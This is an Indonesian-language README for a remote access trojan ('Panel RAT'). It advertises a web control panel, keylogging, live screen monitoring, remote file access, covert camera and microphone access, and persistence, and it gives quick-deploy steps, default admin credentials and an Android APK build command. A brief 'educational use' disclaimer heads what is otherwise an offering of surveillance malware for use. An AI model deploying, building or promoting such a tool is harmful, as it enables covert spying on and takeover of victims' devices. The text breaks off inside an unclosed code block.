# 🦅 Panel RAT — Sistem Kontrol Jarak Jauh

> **⚠️ Peringatan:** Ini untuk keperluan edukasi dan pengujian keamanan. Jangan gunakan untuk aktivitas ilegal.

## 📋 Fitur
- Panel kontrol berbasis web
- Dukungan multi-platform (Windows, Linux, Mac)
- Live screen monitoring
- Akses file system jarak jauh
- Keylogger
- Kamera dan mikrofon jarak jauh
- Auto-start dan persistence

## 🚀 Cara Deploy Cepat

### 1. Pakai Kuberns / Netlify
1. Fork repo ini ke akun GitHub kamu.
2. Login ke Kuberns atau Netlify.
3. Pilih repo ini → Klik **"Deploy"**.

### 2. Pakai Hosting Manual
1. Upload semua file ke hosting (PHP 7.4+).
2. Import database `install.sql`.
3. Ubah `config.php` sesuai database.
4. Akses `admin/login.php` → Login: `admin` / `123456`.

## 📁 Struktur Folder
## 🔑 Login Default
- **Username:** `admin`
- **Password:** `123456`

## 📦 Dependensi
- PHP 7.4+
- MySQL 5.7+
- Apache / Nginx

## 🛠️ Build APK (Android)
Gunakan tool di folder `builder/`:
```bash
cd builder
./build.sh

